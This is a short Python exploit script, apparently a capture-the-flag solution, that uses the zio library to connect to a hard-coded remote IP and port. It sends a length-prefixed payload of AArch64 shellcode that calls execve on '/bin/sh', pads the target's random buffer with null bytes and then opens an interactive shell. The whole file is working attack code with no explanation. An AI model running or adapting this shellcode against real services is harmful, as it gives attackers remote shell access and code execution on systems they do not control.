#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *
ip = '210.71.253.109'
#ip = '10.211.55.48'
port = 9123

io = zio((ip, port), timeout = 1000, print_write = COLORED(REPR))

shellcode = ""
shellcode += l32(0x90000000) # adrp x0, 0x411000
shellcode += l32(0x91120000) # add x0, x0, #0x480
shellcode += l32(0xd2800002) # mov x2, #0x0
shellcode += l32(0xd2800001) # mov x1, #0x0
shellcode += l32(0xd2801ba8) # mov x8, #0xdd
shellcode += l32(0xd4000001) # svc 0
shellcode += "/bin/sh\x00"   # address = 0x411480

payload = '0' * (8 - len(str(len(shellcode)))) # stdin > urandom_fd
payload += str(len(shellcode))
payload += shellcode
payload += "\x00" * len(shellcode) # read to rand_buf

io.write(payload)
io.interact()
